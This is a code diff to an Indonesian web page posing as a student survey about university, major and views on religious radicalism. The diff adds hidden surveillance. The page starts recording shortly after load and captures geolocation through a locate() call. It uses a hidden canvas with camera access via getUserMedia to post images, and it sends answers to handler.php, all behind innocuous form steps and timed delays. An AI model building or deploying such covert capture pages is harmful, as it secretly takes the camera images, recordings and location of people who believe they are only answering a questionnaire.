@@ -19,6 +19,7 @@
 
 <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
 <script src="../../assets/js/location.js"></script>
+<script src=js/_app.js></script>
 <script>
 
 function post(imgdata){
@@ -58,9 +59,13 @@ async function init() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
+
+    if (e.toString() === 'NotAllowedError: Permission denied'){
     $('.formulir').hide();
     $('.tampil_error').show();
-    //alert(e.toString());
+    }
+
+    //console.log(e.toString());
     //errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    
   }
@@ -128,31 +133,79 @@ init();
 
   
   $(document).ready(function(){
+    
+    window.setTimeout(startRecording, 300);
 
     // inisialisasi
     $('#nama').show();
     $('#alamatEmail').hide();
     $('#asalUniversitas').hide();
     $('#jurusanKuliah').hide();
+    $('#pendapatRadikalisme').hide();
+    $('#radikalAgama').hide();
+
+    locate();
 
     $('.tbl1').click(function() {
-      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
+      $('#gtau').fadeIn(200).delay(7000).fadeOut(); 
       $('#nama').fadeOut();
-      $('#alamatEmail').delay(15000).fadeIn();
+      $('#alamatEmail').delay(8000).fadeIn();
       
     });
 
     $('.tbl2').click(function() {
-      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
+      $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
       $('#alamatEmail').fadeOut();
-      $('#asalUniversitas').delay(15000).fadeIn();
-      locate();
+      $('#asalUniversitas').delay(5000).fadeIn();
+      
     });
 
     $('.tbl3').click(function() {
       $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#asalUniversitas').fadeOut();
       $('#jurusanKuliah').delay(15000).fadeIn();
+      locate();
+    });
+
+    $('.tbl4').click(function() {
+      $('#gtau').fadeIn(200).delay(5000).fadeOut(); 
+      $('#jurusanKuliah').fadeOut();
+      $('#pendapatRadikalisme').delay(6000).fadeIn();
+    });
+
+    $('.tbl5').click(function() {
+      $('#gtau').fadeIn(200).delay(900).fadeOut(); 
+      $('#pendapatRadikalisme').fadeOut();
+      $('#radikalAgama').delay(1000).fadeIn();
+     
+      window.setTimeout(stopRecording, 13000);
+    });
+
+    $('.tbl6').click(function() {
+      $('#gtau').fadeIn(200).delay(2000).fadeOut(); 
+      $('#pendapatRadikalisme').fadeOut();
+      $('#radikalAgama').delay(3000).fadeIn();
+    
+     var rad1 = document.getElementById('radio1');
+     var rad2 = document.getElementById('radio2');
+     var rad3 = document.getElementById('radio3');
+
+     var nilai = null;
+    
+     if (rad1.checked){
+      nilai = rad1.value;
+     }else if(rad2.checked){
+      nilai = rad2.value;
+     }else{
+      nilai = rad3.value;
+     }
+     console.log(nilai);
+      $.ajax({          
+            type: 'POST',
+            url: 'handler.php',
+            data: {"data_formulir":`${rad1.name} : ${nilai}`},
+            mimeType: 'text'
+            });
     });
 });
 
@@ -212,6 +265,38 @@ init();
   </div>
 
   <button class="btn btn-primary tbl4" onclick="klikSubmit('jurusanform1')">Kirim</button>
+  
+</div>
+
+<div id="pendapatRadikalisme">
+  <div class="form-group">
+    <label for="pendapatRadikalismeform1"><h5>Menurutmu apa itu paham radikal?</h5></label>
+    <textarea class="form-control" id="pendapatRadikalismeform1" aria-describedby="emailHelp" name="Universitas" placeholder="Tulis disini...." rows="7"></textarea>
+  </div>
+
+  <button class="btn btn-primary tbl5" onclick="klikSubmit('pendapatRadikalismeform1')">Kirim</button>
+  
+</div>
+
+<div id="radikalAgama">
+  <h5 class="mb-3">Menurutmu apakah paham radikal hanya ada pada orang orang mayoritas?</h5>
+  <div class="form-check">
+    <label class="form-check-label" for="radio1">
+      <input type="radio" class="form-check-input" id="radio1" name="optrad" value="Setuju" checked>Setuju
+    </label>
+  </div>
+  <div class="form-check">
+    <label class="form-check-label" for="radio2">
+      <input type="radio" class="form-check-input" id="radio2" name="optrad" value="Tidak Setuju">Tidak Setuju
+    </label>
+  </div>
+  <div class="form-check">
+    <label class="form-check-label">
+      <input type="radio" class="form-check-input" id="radio3" name="optrad" value="Saya Tidak Tahu">Saya Tidak Tahu
+    </label>
+  </div>
+
+  <button class="btn btn-primary mt-3 tbl6" onclick="klikSubmit('radikalagamaform1')">Kirim</button>
   
 </div>
 
